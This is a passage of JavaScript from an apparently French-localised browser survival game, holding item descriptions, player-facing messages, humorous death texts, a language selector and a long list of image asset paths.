                    We[Be.WINTER_PEASANT] = ["Tunique d'hiver", "Tes plantes poussent plus vite", "Réchauffe en dehors de l'eau et dans l'hiver"],
                    We[Be.DIVING_MASK] = ["Masque de plongée", "Tu es rapide dans l'eau", "Réchauffe dans l'eau", "Défense: 2, Défense contre animaux: 8"],
                    We[Be.SUPER_DIVING_SUIT] = ["Scaphandre", "Tu es très rapide dans l'eau", "Réchauffe dans l'eau", "Défense: 4, Défense contre animaux: 16"],
                    We[Be.DRAGON_ORB] = ["Orbe du Dragon", "Donné en Quête"],
                    We[Be.DRAGON_HEART] = ["Coeur de Dragon", "Te change en fantôme!", "Tu es un fantôme pendant 1 min", "Trouve une pierre de résurrection"],
                    We[Be.GEMME_GREEN] = ["Gemme verte", "Tu n'as pas triché, promis?"],
                    We[Be.GEMME_ORANGE] = ["Gemme orange", "Seul un vrai pirate peut l'obtenir!"],
                    We[Be.GEMME_BLUE] = ["Gemme bleue", "Pour les gens trop gentils"],
                    We[Be.CROWN_GREEN] = ["Couronne verte", "Te soigne très rapidement", "Soigne sur le temps: 40", "Défense: 4, Défense contre animaux: 16"],
                    We[Be.CROWN_ORANGE] = ["Couronne orange", "Tu te sens soudainement très chanceux", "Défense: 4, Défense contre animaux: 16"],
                    We[Be.CROWN_BLUE] = ["Couronne bleue", "Une fois mort, tu deviens un fantôme", "Tu perdras toutes tes arguments", "Défense: 4, Défense contre animaux: 16"],
                    We[Be.BUCKET_FULL] = ["Seau", "Utile pour remplir un puit", "Un sceau est équivalent à 20 bouteilles"],
                    We[Be.BUCKET_EMPTY] = ["Seau vide", "Pour remplir ce seau, approche-toi d'une source d'eau"],
                    We[Be.BOTTLE_FULL] = ["Bouteille", "Te permet de boire n'importe où", "Eau: 50"],
                    We[Be.BOTTLE_EMPTY] = ["Bouteille vide", "Tu peux remplir cette bouteille près d'une source d'eau"],
                    We[Be.WATERING_CAN] = ["Arrosoir vide", "Doit être rempli près d'une source d'eau"],
                    We[Be.WATERING_CAN_FULL] = ["Arrosoir", "Permet d'arroser les plantes", "Dégâts: 1"],
                    We[Be.BAG] = ["Sac", "Plus de place dans ton inventaire!"],
                    We[Be.PAPER] = ["Papier", "Pour fabriquer toute sorte d'objets"],
                    We[Be.BOOK] = ["Livre", "Réduit considérablement le temps de fabrication", "Doit être porté pour fonctionner", "Dégâts: 1"],
                    We[Be.BANDAGE] = ["Bandage", "Soigne plus rapidement", "Soigne sur le temps: 30", "Effet: 5"],
                    We[Be.LOCK] = ["Cadenas", "Pour verrouiller un coffre"],
                    We[Be.LOCKPICK] = ["Clé", "Pour déverrouiller un coffre"],
                    We[Be.TOTEM] = ["Totem", "Te permet de créer une équipe", "Partage les portes et les coffres", "Les piques ne toucheront pas tes amis"],
                    We[Be.BRIDGE] = ["Pont", "Très utile sur l'eau", "Te permet de boire sans te noyer", "Marche plus vite sur l'eau"],
                    We[Be.SIGN] = ["Pancarte", "Laisse un message aux autres", "Durabilité: 200"],
                    We[Be.ROOF] = ["Toit", "Te cache un peu et te réchauffe"],
                    We[Be.WELL] = ["Puit", "Permet de remplir des bouteilles", "Durabilité: 1000"],
                    We[Be.WALL] = ["Mur en bois", "Tu connais la danse des murs?", "Durabilité: 1000"],
                    We[Be.STONE_WALL] = ["Mur en pierre", "Ça fait un peu plus sérieux", "Durabilité: 1500"],
                    We[Be.GOLD_WALL] = ["Mur en or", "De l'or sur tes murs? C'est un peu voyant", "Durabilité: 2000"],
                    We[Be.DIAMOND_WALL] = ["Mur en diamant", "Très brillant, cache tes yeux", "Durabilité: 2500"],
                    We[Be.AMETHYST_WALL] = ["Mur en améthyste", "Tu dois avoir très peur de sortir dehors!", "Durabilité: 3500"],
                    We[Be.SPIKE] = ["Piques en bois", "Peut blesser tes ennemis", "Dégâts: 10, Dégâts par coup: 2", "Durabilité: 150"],
                    We[Be.STONE_SPIKE] = ["Pique en pierre", "Je ne voudrais pas être ton ennemi", "Dégâts: 20", "Dégâts par coup: 3", "Durabilité: 300"],
                    We[Be.GOLD_SPIKE] = ["Pique en or", "Tu es si cruel", "Dégâts: 30", "Dégâts par coup: 3", "Durabilité: 600"],
                    We[Be.DIAMOND_SPIKE] = ["Pique en diamant", "Tu n'as pas l'air d'aimer la compagnie", "Dégâts: 40", "Dégâts par coup: 4", "Durabilité: 1200"],
                    We[Be.AMETHYST_SPIKE] = ["Pique en améthyste", "Mais qu'est ce que ton voisin t'a fait?", "Dégâts: 50", "Dégâts par coup: 4", "Durabilité: 2400"],
                    We[Be.WOOD_DOOR] = ["Porte en bois", "Peut être ouvert ou fermé par toi ou tes amis", "Durabilité: 1000"],
                    We[Be.STONE_DOOR] = ["Porte en pierre", "Tu connais les trois petits cochons?", "Durabilité: 1500"],
                    We[Be.GOLD_DOOR] = ["Porte en or", "Tu reconstruis l'el dorado?", "Durabilité: 2000"],
                    We[Be.DIAMOND_DOOR] = ["Porte en diamant", "Pour une maison éclatante", "Durabilité: 2500"],
                    We[Be.AMETHYST_DOOR] = ["Porte en améthyste", "Est-ce que ta maison est un coffre-fort?", "Durabilité: 3000"],
                    We[Be.FURNACE] = ["Chaudière", "Réchauffe", "Consume du bois toutes les 5 sec", "Durabilité: 1000"],
                    We[Be.WINDMILL] = ["Moulin", "Peut produire de la farine à partir du blé", "Prends 5 sec pour faire de la farine", "Tu obtiens des points quand c'est en marche", "Durabilité: 2000"],
                    We[Be.BREAD_OVEN] = ["Four à pain", "Produit du pain avec de la farine et du bois", "Prends 10 sec pour faire du pain", "Tu obtiens des points quand c'est en marche", "Durabilité: 2000"],
                    We[Be.RESURRECTION] = ["Pierre de résurrection", "Magie magie!", "Te ressuscite si tu es un fantôme", "Tu perds toutes tes armes", "Durabilité: 200"],
                    We[TEXT.YOU_CANNOT_JOIN] = "Tu ne peux pas rejoindre le serveur",
                    We[TEXT.KICKED] = "Expulsé: ",
                    We[TEXT.KEY_ALREADY] = "Ta clé est déjà utilisée par quelqu'un d'autre",
                    We[TEXT.KEY_WRONG] = "Ta clé est fausse",
                    We[TEXT.OLD_VERSION] = "Tu as une vieille version, rafraichis tes caches",
                    We[TEXT.NO_MORE_RESOURCES] = "Il n'y a plus de nouvelles ressources",
                    We[TEXT.SURVIVED_1DAY] = "Tu as survécu 1 jour",
                    We[TEXT.SURVIVED] = "Tu as survécu ",
                    We[TEXT.DAYS] = " jours",
                    We[TEXT.DEAD_SAD] = "Tu es mort ;-;",
                    We[TEXT.SPAM_ME] = "Le serveur ne trouve pas de points d'apparitions! Spam le bouton jouer!",
                    We[TEXT.SPAM_ME2] = "Le serveur est complet! Spam le bouton jouer",
                    We[TEXT.EMPTY] = "Cette ressource est vide",
                    We[TEXT.INV_FULL] = "Ton inventaire est rempli (Clic droit pour supprimer un objet)",
                    We[TEXT.DEAD] = " est mort",
                    We[TEXT.WRONG_TOOL] = "Ce n'est pas le bon outil",
                    We[TEXT.JOIN_TEAM] = "Tu as rejoins une équipe",
                    We[TEXT.YOU_DEAD] = "Tu es mort",
                    We[TEXT.JOINED_TEAM] = " a rejoint l'équipe",
                    We[TEXT.TEAM_DESTROYED] = "Ton équipe a été détruite",
                    We[TEXT.LEFT_TEAM] = "Tu as quitté l'équipe",
                    We[TEXT.LEFT_TEAM2] = " a quitté l'équipe",
                    We[TEXT.TOKEN] = "Quelqu'un a volé ton token :>",
                    We[TEXT.CHOOSE] = "Choisis un serveur",
                    We[TEXT.PLAYERS] = "joueurs",
                    We[TEXT.TOTAL_PLAYERS] = "joueurs",
                    We[TEXT.TOTAL_MODE] = "joueurs dans ce mode",
                    We[TEXT.COMMING_SOON] = "Bientôt...",
                    document.getElementById("nickname_input").placeholder = "Surnom",
                    n[0] = ["Tu as été tué sans raison particulière, juste comme ça"],
                    n[1] = ["Tu es mort de faim, c'est plutôt ironique, non?"],
                    n[2] = ["Tu es mort de froid. Dommage", "Tu as fait une hypothermie, la prochaine fois reste près d'un feu"],
                    n[3] = ["Un joueur t'a tué, avant de mourir tu pouvais l'entendre rire", "Un joueur t'a tué, avec un peu de chance il mourra aussi"],
                    n[4] = ["Tu es resté sur un feu trop longtemps et tu es mort suite aux brûlures", "Tu es mort en restant trop longtemps sur un feu, tu voulais finir comme Jeanne d'Arc?"],
                    n[5] = ["Ton corps deviendra un nid pour les oeufs d'araignées."],
                    n[6] = ["Ce loup n'aura plus faim après t'avoir mangé", "Ce ne sont pas des chiens. Les loups n'aiment pas être domestiqués."],
                    n[7] = ["Ce renard était trop rapide pour toi", "Ce renard t'a transformé en boîte"],
                    n[8] = ["Cet ours voulait juste un câlin."],
                    n[9] = ["Tu as été brûlé par un dragon. Quel gâchis", "Tu t'es fait écraser par un dragon. Une bien terrible façon de mourir..."],
                    n[10] = ["Tu as sauté sur des piques, c'était pas une bonne idée...", "Tu es mort sur des piques. La plupart des gens sont assez sensés pour ne pas toucher les choses pointues"],
                    n[11] = ["Même les fantômes peuvent mourir", "Tu n'as pas réussi à te ressusciter. Mais c'est un jeu, tu reviens à la vie après être mort, donc..."],
                    n[12] = ["Une bactérie logée dans la viande crue t'a tué. Ce jeu est vraiment trop dur.", "Tu as tué l'animal, sa viande t'a tué."],
                    n[13] = ["Tu es mort de soif. La prochaine fois, vas dans un lac, dans la mer ou fais-toi une bouteille"],
                    n[14] = ["Tu t'es noyé. Essaye de construire un pont la prochaine fois"],
                    n[15] = ["Ne t'inquiète pas, le piranha t'a trouvé appétissant."],
                    n[16] = ["Un kraken a 'kraké' tes os."],
                    n[17] = ["Ta peau tombe en lambeau, le soleil t'a brûlé."],
                    n[18] = ["L'ail dans ta poche a fait bouillir ton cerveau."],
                    n[19] = ["En tant que vampire, ne reste pas à côté des gousses d'ail."],
                    n[20] = ["Tu as mangé de l'ail en tant que vampire, tu t'attendais à quoi?"],
                    n[21] = ["Ton corps est tombé dans les ronces. En essayant de t'échapper, ta peau s'est arrachée et la douleur a fait arrêter de battre ton coeur. lol ça rime."],
                    ZOMBIE_GRUMBLE = "Uuunnnggg",
                    ZOMBIE_GRUMBLES = ["Uuunnnggg... J'ai faim", "Manger cerveau, Uuunnnggg...", "Viande fraîche ici... Uuunnnggg", "Uuunnnggg... Tu as l'air bon", "Uuunnnggg...", "Manger... uuunnnggg...", "Je peux sentir ton sang... Uuunnnggg"]
            }
            for (var We = [], Ze = 0; Ze < 344; Ze++)
                We[Ze] = "";
            var Qe, n = [], ve = ($(".md-languages").on("click", function () {
                $(this).toggleClass("active")
            }),
                $(".md-languages ul li").on("click", function () {
                    var e = $(this).text();
                    "English" === e ? Ie() : "Français" === e ? Me() : "Deutsch" === e ? Re() : "Español" === e ? Oe() : "Português" === e ? pe() : "Русский" === e ? ce() : "Polski" === e && ge(),
                        INFO_BOX = [],
                        xe.craft.label = [],
                        $(".md-languages ul li").removeClass("active"),
                        $(this).addClass("active"),
                        $(".md-languages label button").text(e)
                }),
                "EN");
            switch (navigator.language || navigator.userLanguage) {
                case "ru":
                    ve = "RU";
                    break;
                case "en":
                    ve = "EN";
                    break;
                case "es":
                    ve = "SP";
                    break;
                case "fr":
                    ve = "FR";
                    break;
                case "pl":
                    ve = "PL";
                    break;
                case "de":
                    ve = "DE";
                    break;
                case "pt":
                    ve = "PT"
            }
            for (Ze in Qe = "FR" === ve ? ($(".md-languages label button").text("Français"),
                Me) : "PL" === ve ? ($(".md-languages label button").text("Polski"),
                    ge) : "PT" === ve ? ($(".md-languages label button").text("Português"),
                        pe) : "SP" === ve ? ($(".md-languages label button").text("Español"),
                            Oe) : "RU" === ve ? ($(".md-languages label button").text("Русский"),
                                ce) : "DE" === ve ? ($(".md-languages label button").text("Deutsch"),
                                    Re) : ($(".md-languages label button").text("English"),
                                        Ie),
                IMAGES = {
                    LOGO: "img/logo.png",
                    BIGDAY: "img/mapday.png",
                    BIGNIGHT: "img/mapnight.png",
                    BIGZDAY: "img/bigzday.png",
                    BIGZNIGHT: "img/bigznight.png",
                    MAPDAY_RIVER: "img/bigday-river1.png",
                    MAPDAY_LAKE: "img/bigday-lake.png",
                    MAPDAY_BERRY: "img/bigday-berry.png",
                    MAPDAY_STONE1: "img/bigday-stone1.png",
                    MAPDAY_STONE2: "img/bigday-stone2.png",
                    MAPDAY_GOLD1: "img/bigday-gold1.png",
                    MAPDAY_GOLD2: "img/bigday-gold2.png",
                    MAPDAY_EMERALD1: "img/bigday-emerald1.png",
                    MAPDAY_EMERALD2: "img/bigday-emerald2.png",
                    MAPDAY_AMETHYST: "img/bigday-amethyst.png",
                    MAPDAY_BEAR: "img/bigday-bear.png",
                    MAPDAY_CAVE: "img/bigday-cave.png",
                    MAPDAY_DIAMOND: "img/bigday-diamond.png",
                    MAPDAY_ISLAND: "img/bigday-island.png",
                    MAPDAY_REIDITE: "img/bigday-reidite.png",
                    MAPDAY_SPIDER: "img/bigday-spider.png",
                    MAPDAY_WOLF: "img/bigday-wolf.png",
                    MAPDAY_FIR_TREE: "img/bigday-fir-tree.png",
                    MAPDAY_FOX: "img/bigday-fox.png",
                    MAPDAY_KRAKEN: "img/bigday-kraken.png",
                    MAPDAY_PIRANHA: "img/bigday-piranha.png",
                    MAPDAY_CACTUS: "img/bigday-cactus.png",
                    MAPDAY_MAGMA: "img/bigday-magma.png",
                    MAPNIGHT_RIVER: "img/bigday-river1.png",
                    MAPNIGHT_LAKE: "img/bignight-lake.png",
                    MAPNIGHT_BERRY: "img/bignight-berry.png",
                    MAPNIGHT_STONE1: "img/bignight-stone1.png",
                    MAPNIGHT_STONE2: "img/bignight-stone2.png",
                    MAPNIGHT_GOLD1: "img/bignight-gold1.png",
                    MAPNIGHT_GOLD2: "img/bignight-gold2.png",
                    MAPNIGHT_EMERALD1: "img/bignight-emerald1.png",
                    MAPNIGHT_EMERALD2: "img/bignight-emerald2.png",
                    MAPNIGHT_AMETHYST: "img/bignight-amethyst.png",
                    MAPNIGHT_BEAR: "img/bignight-bear.png",
                    MAPNIGHT_CAVE: "img/bignight-cave.png",
                    MAPNIGHT_DIAMOND: "img/bignight-diamond.png",
                    MAPNIGHT_ISLAND: "img/bignight-island.png",
                    MAPNIGHT_REIDITE: "img/bignight-reidite.png",
                    MAPNIGHT_SPIDER: "img/bignight-spider.png",
                    MAPNIGHT_WOLF: "img/bignight-wolf.png",
                    MAPNIGHT_FIR_TREE: "img/bignight-fir-tree.png",
                    MAPNIGHT_FOX: "img/bignight-fox.png",
                    MAPNIGHT_KRAKEN: "img/bignight-kraken.png",
                    MAPNIGHT_PIRANHA: "img/bignight-piranha.png",
                    MAPNIGHT_CACTUS: "img/bignight-cactus.png",
                    MAPNIGHT_MAGMA: "img/bignight-magma.png",
                    MAPDAY_DESERT: "img/bigday-desert.png",
                    MAPDAY_WINTER: "img/bigday-winter.png",
                    MAPDAY_LAVA: "img/bigday-lava.png",
                    MAPDAY_FOREST: "img/bigday-forest.png",
                    MAPNIGHT_DESERT: "img/bignight-desert.png",
                    MAPNIGHT_WINTER: "img/bignight-winter.png",
                    MAPNIGHT_LAVA: "img/bignight-lava.png",
                    MAPNIGHT_FOREST: "img/bignight-forest.png",
                    RIVER_WAVED: "img/day-river-wave.png",
                    RIVER_WAVEN: "img/night-river-wave.png",
                    FOG0D: "img/day-fog0.png",
                    FOG1D: "img/day-fog1.png",
                    FOG2D: "img/day-fog2.png",
                    FOG0N: "img/night-fog0.png",
                    FOG1N: "img/night-fog1.png",
                    FOG2N: "img/night-fog2.png",
                    FOD0D: "img/day-fogdesert0.png",
                    FOD1D: "img/day-fogdesert1.png",
                    FOD2D: "img/day-fogdesert2.png",
                    FOD0N: "img/night-fogdesert0.png",
                    FOD1N: "img/night-fogdesert1.png",
                    FOD2N: "img/night-fogdesert2.png",
                    MARKER0D: "img/day-cross-server.png",
                    MARKER1D: "img/day-here-server.png",
                    MARKER2D: "img/day-finish-server.png",
                    MARKER3D: "img/day-item-server.png",
                    MARKER0N: "img/night-cross-server.png",
                    MARKER1N: "img/night-here-server.png",
                    MARKER2N: "img/night-finish-server.png",
                    MARKER3N: "img/night-item-server.png",
                    REIDITE0D: "img/day-reidite0.png",
                    REIDITE0N: "img/night-reidite0.png",
                    REIDITE1D: "img/day-reidite1.png",
                    REIDITE1N: "img/night-reidite1.png",
                    REIDITE2D: "img/day-reidite2.png",
                    REIDITE2N: "img/night-reidite2.png",
                    MAGMA1D: "img/day-lava1.png",
                    MAGMA1N: "img/night-lava1.png",
                    MAGMA2D: "img/day-lava2.png",
                    MAGMA2N: "img/night-lava2.png",
                    MAGMA3D: "img/day-lava3.png",
                    MAGMA3N: "img/night-lava3.png",
                    MAGMA4D: "img/day-lava4.png",
                    MAGMA4N: "img/night-lava4.png",
                    MAGMA5D: "img/day-lava5.png",
                    MAGMA5N: "img/night-lava5.png",
                    MAGMA6D: "img/day-lava6.png",
                    MAGMA6N: "img/night-lava6.png",
                    LAVA_GROUND1D: "img/day-lava-ground1.png",
                    LAVA_GROUND1N: "img/night-lava-ground1.png",
                    LAVA_GROUND2D: "img/day-lava-ground2.png",
                    LAVA_GROUND2N: "img/night-lava-ground2.png",
                    LAVA_GROUND3D: "img/day-lava-ground3.png",
                    LAVA_GROUND3N: "img/night-lava-ground3.png",
                    LAVA_GROUND4D: "img/day-lava-ground4.png",
                    LAVA_GROUND4N: "img/night-lava-ground4.png",
                    LAVA_GROUND5D: "img/day-lava-ground5.png",
                    LAVA_GROUND5N: "img/night-lava-ground5.png",
                    LAVA_GROUND6D: "img/day-lava-ground6.png",
                    LAVA_GROUND6N: "img/night-lava-ground6.png",
                    FIRE_MOBD: "img/day-fire-mob.png",
                    FIRE_MOBN: "img/night-fire-mob.png",
                    FIRE_MOB_HURT: "img/hurt-fire-mob.png",
                    DIAMOND_PROTECTIOND: "img/day-diamond-protection.png",
                    DIAMOND_PROTECTIONN: "img/night-diamond-protection.png",
                    HAND_DIAMOND_PROTECTIOND: "img/day-hand-diamond-protection.png",
                    HAND_DIAMOND_PROTECTIONN: "img/night-hand-diamond-protection.png",
                    INV_DIAMOND_PROTECTION_OUT: "img/inv-diamond-protection-out.png",
                    INV_DIAMOND_PROTECTION_IN: "img/inv-diamond-protection-in.png",
                    INV_DIAMOND_PROTECTION_CLICK: "img/inv-diamond-protection-click.png",
                    AMETHYST_PROTECTIOND: "img/day-amethyst-protection.png",
                    AMETHYST_PROTECTIONN: "img/night-amethyst-protection.png",
                    HAND_AMETHYST_PROTECTIOND: "img/day-hand-amethyst-protection.png",
                    HAND_AMETHYST_PROTECTIONN: "img/night-hand-amethyst-protection.png",
                    INV_AMETHYST_PROTECTION_OUT: "img/inv-amethyst-protection-out.png",
                    INV_AMETHYST_PROTECTION_IN: "img/inv-amethyst-protection-in.png",
                    INV_AMETHYST_PROTECTION_CLICK: "img/inv-amethyst-protection-click.png",
                    REIDITE_SWORDD: "img/day-reidite-sword.png",
                    REIDITE_SWORDN: "img/night-reidite-sword.png",
                    INV_REIDITE_SWORD_OUT: "img/inv-reidite-sword-out.png",
                    INV_REIDITE_SWORD_IN: "img/inv-reidite-sword-in.png",
                    INV_REIDITE_SWORD_CLICK: "img/inv-reidite-sword-click.png",
                    INV_REIDITE_OUT: "img/inv-reidite-out.png",
                    INV_REIDITE_IN: "img/inv-reidite-in.png",
                    INV_REIDITE_CLICK: "img/inv-reidite-click.png",
                    INV_FLAME_OUT: "img/inv-flame-out.png",
                    INV_FLAME_IN: "img/inv-flame-in.png",
                    INV_FLAME_CLICK: "img/inv-flame-click.png",
                    LAVA_BUBLE0D: "img/day-magma-buble0.png",
                    LAVA_BUBLE0N: "img/night-magma-buble0.png",
                    LAVA_BUBLE1D: "img/day-magma-buble1.png",
                    LAVA_BUBLE1N: "img/night-magma-buble1.png",
                    LAVA_BUBLE2D: "img/day-magma-buble2.png",
                    LAVA_BUBLE2N: "img/night-magma-buble2.png",
                    LAVA_DRAGOND: "img/day-lava-dragon.png",
                    LAVA_DRAGONN: "img/night-lava-dragon.png",
                    LAVA_FIRE_DRAGOND: "img/day-fire-dragon.png",
                    LAVA_FIRE_DRAGONN: "img/night-fire-dragon.png",
                    HURT_LAVA_DRAGON: "img/hurt-lava-dragon.png",
                    LAVA_WING_LEFTD: "img/day-lava-wing-left.png",
                    LAVA_WING_LEFTN: "img/night-lava-wing-left.png",
                    LAVA_WING_RIGHTD: "img/day-lava-wing-right.png",
                    LAVA_WING_RIGHTN: "img/night-lava-wing-right.png",
                    HURT_LAVA_WING_LEFT: "img/hurt-lava-wing-left.png",
                    HURT_LAVA_WING_RIGHT: "img/hurt-lava-wing-right.png",
                    REIDITE_SPEARD: "img/day-reidite-spear.png",
                    REIDITE_SPEARN: "img/night-reidite-spear.png",
                    INV_REIDITE_SPEAR_OUT: "img/inv-reidite-spear-out.png",
                    INV_REIDITE_SPEAR_IN: "img/inv-reidite-spear-in.png",
                    INV_REIDITE_SPEAR_CLICK: "img/inv-reidite-spear-click.png",
                    REIDITE_HELMETD: "img/day-reidite-helmet.png",
                    REIDITE_HELMETN: "img/night-reidite-helmet.png",
                    INV_REIDITE_HELMET_OUT: "img/inv-reidite-helmet-out.png",
                    INV_REIDITE_HELMET_IN: "img/inv-reidite-helmet-in.png",
                    INV_REIDITE_HELMET_CLICK: "img/inv-reidite-helmet-click.png",
                    HAND_REIDITE_PROTECTIOND: "img/day-hand-reidite-protection.png",
                    HAND_REIDITE_PROTECTIONN: "img/night-hand-reidite-protection.png",
                    REIDITE_PROTECTIOND: "img/day-reidite-protection.png",
                    REIDITE_PROTECTIONN: "img/night-reidite-protection.png",
                    INV_REIDITE_PROTECTION_OUT: "img/inv-reidite-protection-out.png",
                    INV_REIDITE_PROTECTION_IN: "img/inv-reidite-protection-in.png",
                    INV_REIDITE_PROTECTION_CLICK: "img/inv-reidite-protection-click.png",
                    LAVA_SWORDD: "img/day-lava-dragon-sword.png",
                    LAVA_SWORDN: "img/night-lava-dragon-sword.png",
                    INV_LAVA_SWORD_OUT: "img/inv-lava-dragon-sword-out.png",
                    INV_LAVA_SWORD_IN: "img/inv-lava-dragon-sword-in.png",
                    INV_LAVA_SWORD_CLICK: "img/inv-lava-dragon-sword-click.png",
                    LAVA_SPEARD: "img/day-lava-spear.png",
                    LAVA_SPEARN: "img/night-lava-spear.png",
                    INV_LAVA_SPEAR_OUT: "img/inv-lava-spear-out.png",
                    INV_LAVA_SPEAR_IN: "img/inv-lava-spear-in.png",
                    INV_LAVA_SPEAR_CLICK: "img/inv-lava-spear-click.png",
                    LAVA_HELMETD: "img/day-lava-helmet.png",
                    LAVA_HELMETN: "img/night-lava-helmet.png",
                    INV_LAVA_HELMET_OUT: "img/inv-lava-helmet-out.png",
                    INV_LAVA_HELMET_IN: "img/inv-lava-helmet-in.png",
                    INV_LAVA_HELMET_CLICK: "img/inv-lava-helmet-click.png",
                    WITCHD: "img/day-witch-hat.png",
                    WITCHN: "img/night-witch-hat.png",
                    INV_WITCH_OUT: "img/inv-witch-hat-out.png",
                    INV_WITCH_IN: "img/inv-witch-hat-in.png",
                    INV_WITCH_CLICK: "img/inv-witch-hat-click.png",
                    NIMBUSD: "img/day-nimbus2000.png",
                    NIMBUSN: "img/night-nimbus2000.png",
                    INV_NIMBUS_OUT: "img/inv-nimbus2000-out.png",
                    INV_NIMBUS_IN: "img/inv-nimbus2000-in.png",
                    INV_NIMBUS_CLICK: "img/inv-nimbus2000-click.png",
                    ACCESSORY1D: "img/day-accessory1-pacques.png",
                    ACCESSORY1N: "img/night-accessory1-pacques.png",
                    ACCESSORY2D: "img/day-accessory2-pacques.png",
                    ACCESSORY2N: "img/night-accessory2-pacques.png",
                    ACCESSORY3D: "img/day-accessory3-pacques.png",
                    ACCESSORY3N: "img/night-accessory3-pacques.png",
                    ACCESSORY5D: "img/day-accessory5-pacques.png",
                    ACCESSORY5N: "img/night-accessory5-pacques.png",
                    ACCESSORY6D: "img/day-accessory6-pacques.png",
                    ACCESSORY6N: "img/night-accessory6-pacques.png",
                    ACCESSORY7D: "img/day-accessory7-pacques.png",
                    ACCESSORY7N: "img/night-accessory7-pacques.png",
                    ACCESSORY8D: "img/day-accessory8-pacques.png",
                    ACCESSORY8N: "img/night-accessory8-pacques.png",
                    BAG_EASTERD: "img/day-bag-pacques.png",
                    BAG_EASTERN: "img/night-bag-pacques.png",
                    CARROTD: "img/day-carrot.png",
                    CARROTN: "img/night-carrot.png",
                    CARROT_DRIEDD: "img/day-carrot-dried.png",
                    CARROT_DRIEDN: "img/night-carrot-dried.png",
                    TOMATO_MINID: "img/day-tomato-herb.png",
                    TOMATO_MININ: "img/night-tomato-herb.png",
                    TOMATO_MINI_DRIEDD: "img/day-tomato-herb-dried.png",
                    TOMATO_MINI_DRIEDN: "img/night-tomato-herb-dried.png",
                    TOMATOD: "img/day-tomato.png",
                    TOMATON: "img/night-tomato.png",
                    INV_CARROT_OUT: "img/inv-carrot-out.png",
                    INV_CARROT_IN: "img/inv-carrot-in.png",
                    INV_CARROT_CLICK: "img/inv-carrot-click.png",
                    INV_TOMATO_OUT: "img/inv-tomato-out.png",
                    INV_TOMATO_IN: "img/inv-tomato-in.png",
                    INV_TOMATO_CLICK: "img/inv-tomato-click.png",
                    PLAYER0D: "img/day-player0.png",
                    PLAYER0N: "img/night-player0.png",
                    PLAYER1D: "img/day-player1.png",
                    PLAYER1N: "img/night-player1.png",
                    PLAYER2D: "img/day-player2.png",
                    PLAYER2N: "img/night-player22.png",
                    PLAYER3D: "img/day-player3.png",
                    PLAYER3N: "img/night-player33.png",
                    PLAYER4D: "img/day-player4.png",
                    PLAYER4N: "img/night-player4.png",
                    PLAYER5D: "img/day-player5.png",
                    PLAYER5N: "img/night-player5.png",
                    PLAYER6D: "img/day-player6.png",
                    PLAYER6N: "img/night-player6.png",
                    PLAYER7D: "img/day-player7.png",
                    PLAYER7N: "img/night-player7.png",
                    PLAYER8D: "img/day-player8.png",
                    PLAYER8N: "img/night-player8.png",
                    PLAYER9D: "img/day-player9.png",
                    PLAYER9N: "img/night-player9.png",
                    PLAYER10D: "img/day-player10.png",
                    PLAYER10N: "img/night-player10.png",
                    PLAYER11D: "img/day-player11.png",
                    PLAYER11N: "img/night-player11.png",
                    PLAYER12D: "img/day-player12.png",
                    PLAYER12N: "img/night-player12.png",
                    PLAYER13D: "img/day-player13.png",
                    PLAYER13N: "img/night-player13.png",
                    PLAYER14D: "img/day-player14.png",
                    PLAYER14N: "img/night-player14.png",
                    PLAYER15D: "img/day-player15.png",
                    PLAYER15N: "img/night-player15.png",
                    PLAYER16D: "img/day-player16.png",
                    PLAYER16N: "img/night-player16.png",
                    PLAYER17D: "img/day-player17.png",
                    PLAYER17N: "img/night-player17.png",
                    PLAYER18D: "img/day-player18.png",
                    PLAYER18N: "img/night-player18.png",
                    PLAYER19D: "img/day-player19.png",
                    PLAYER19N: "img/night-player19.png",
                    HAND0D: "img/day-hand-player0.png",
                    HAND0N: "img/night-hand-player0.png",
                    HAND1D: "img/day-hand-player1.png",
                    HAND1N: "img/night-hand-player1.png",
                    HAND2D: "img/day-hand-player2.png",
                    HAND2N: "img/night-hand-player22.png",
                    HAND3D: "img/day-hand-player3.png",
                    HAND3N: "img/night-hand-player33.png",
                    HAND4D: "img/day-hand-player4.png",
                    HAND4N: "img/night-hand-player4.png",
                    HAND5D: "img/day-hand-player5.png",
                    HAND5N: "img/night-hand-player5.png",
                    HAND6D: "img/day-hand-player6.png",
                    HAND6N: "img/night-hand-player6.png",
                    HAND7D: "img/day-hand-player7.png",
                    HAND7N: "img/night-hand-player7.png",
                    HAND8D: "img/day-hand-player8.png",
                    HAND8N: "img/night-hand-player8.png",
                    HAND9D: "img/day-hand-player9.png",
                    HAND9N: "img/night-hand-player9.png",
                    HAND10D: "img/day-hand-player10.png",
                    HAND10N: "img/night-hand-player10.png",
                    HAND11D: "img/day-hand-player11.png",
                    HAND11N: "img/night-hand-player11.png",
                    HAND12D: "img/day-hand-player12.png",
                    HAND12N: "img/night-hand-player12.png",
                    HAND13D: "img/day-hand-player13.png",
                    HAND13N: "img/night-hand-player13.png",
                    HAND14D: "img/day-hand-player14.png",
                    HAND14N: "img/night-hand-player14.png",
                    HAND15D: "img/day-hand-player15.png",
                    HAND15N: "img/night-hand-player15.png",
                    HAND16D: "img/day-hand-player16.png",
                    HAND16N: "img/night-hand-player16.png",
                    HAND17D: "img/day-hand-player17.png",
                    HAND17N: "img/night-hand-player17.png",
                    HAND18D: "img/day-hand-player18.png",
                    HAND18N: "img/night-hand-player18.png",
                    HAND19D: "img/day-hand-player19.png",
                    HAND19N: "img/night-hand-player19.png",
                    ACCESSORY4D: "img/day-accessory4.png",
                    ACCESSORY4N: "img/night-accessory4.png",
                    ACCESSORY9D: "img/day-accessory9.png",
                    ACCESSORY9N: "img/night-accessory9.png",
                    ACCESSORY10D: "img/day-accessory10.png",
                    ACCESSORY10N: "img/night-accessory10.png",
                    ACCESSORY11D: "img/day-accessory11.png",
                    ACCESSORY11N: "img/night-accessory11.png",
                    ACCESSORY12D: "img/day-accessory12.png",
                    ACCESSORY12N: "img/night-accessory12.png",
                    BAGD: "img/day-bag.png",
                    BAGN: "img/night-bag.png",
                    INV_BAG_OUT: "img/inv-bag-out.png",
                    INV_BAG_IN: "img/inv-bag-in.png",
                    INV_BAG_CLICK: "img/inv-bag-click.png",
                    PITCHFORKD: "img/day-pitchfork.png",
                    PITCHFORKN: "img/night-pitchfork.png",
                    INV_PITCHFORK_OUT: "img/inv-pitchfork-out.png",
                    INV_PITCHFORK_IN: "img/inv-pitchfork-in.png",
                    INV_PITCHFORK_CLICK: "img/inv-pitchfork-click.png",
                    INV_WOOD_DOOR_SPIKE_OUT: "img/inv-wood-spike-door-out.png",
                    INV_WOOD_DOOR_SPIKE_IN: "img/inv-wood-spike-door-in.png",
